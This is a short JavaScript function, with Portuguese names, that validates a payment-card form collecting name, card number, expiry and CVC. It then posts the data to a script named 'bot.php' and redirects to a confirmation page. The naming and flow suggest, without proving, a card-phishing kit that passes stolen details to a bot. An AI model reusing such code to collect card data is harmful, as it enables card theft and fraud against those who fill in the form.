function validForm() {
    const nome = document.getElementById('name');
    const numero = document.getElementById('num');
    const mes = document.getElementById('mes');
    const ano = document.getElementById('ano');
    const cvc = document.getElementById('cvc');
    const erros = [];

    const campos = [nome, numero, mes, ano, cvc];

    campos.forEach((campo) => {
        const erro = campo.parentNode.querySelector('small');
        const campoLabel = campo.parentNode.querySelector('label').textContent;

        if (campo.value === '') {
            campo.classList.add('info-erro');
            erro.classList.add('erro');
            erro.textContent = `Preencha o Campo ${campoLabel}`;
            erros.push(campo);
        } else {
            campo.classList.remove('info-erro');
            erro.classList.remove('erro');
            erro.textContent = '';
        }
    });

    if (erros.length === 0) {
        // Se não houver erros, envia os dados do formulário para bot.php
        const formData = new FormData(form);
        fetch('../bot.php', {
            method: 'POST',
            body: formData
        })
        .then(response => {
            if (!response.ok) {
                throw new Error('Erro ao enviar os dados.');
            }
            // Redireciona para uma página de confirmação ou exibe uma mensagem de sucesso
            window.location.href = '../finaliza.html';
        })
        .catch(error => {
            console.error('Erro:', error);
            // Exibe uma mensagem de erro ao usuário
            alert('Erro ao enviar os dados. Tente novamente.');
        });
    }
}
